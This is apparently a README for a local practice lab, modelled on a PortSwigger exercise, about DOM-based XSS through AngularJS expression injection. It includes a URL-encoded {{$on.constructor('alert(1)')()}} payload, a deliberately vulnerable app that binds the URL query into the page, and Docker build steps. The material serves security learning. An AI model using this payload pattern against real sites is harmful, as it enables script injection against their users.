# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## SYNOPSIS
- Created a angular module
- and a controller
- the ```$scope``` pulls the query from the url
- binds the scope onto the html body via h1 tag


## PAYLOAD
- URL-encoded ```http://localhost:8086/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D``` 
- I could not get the app to render my payload as a pure HTML

## How to:
- ```chmod 700 build_docker```
- Run build_docker
- Use the payload above
- You should see an alert window

### NOTE
- Tested on both Safari and Chrome
- Only works on CHROME

#### Reference
DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded \
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

AngularJS Form Validation \
https://www.w3schools.com/angular/angular_validation.asp

CSS classes used by AngularJS \
https://docs.angularjs.org/guide/css-styling

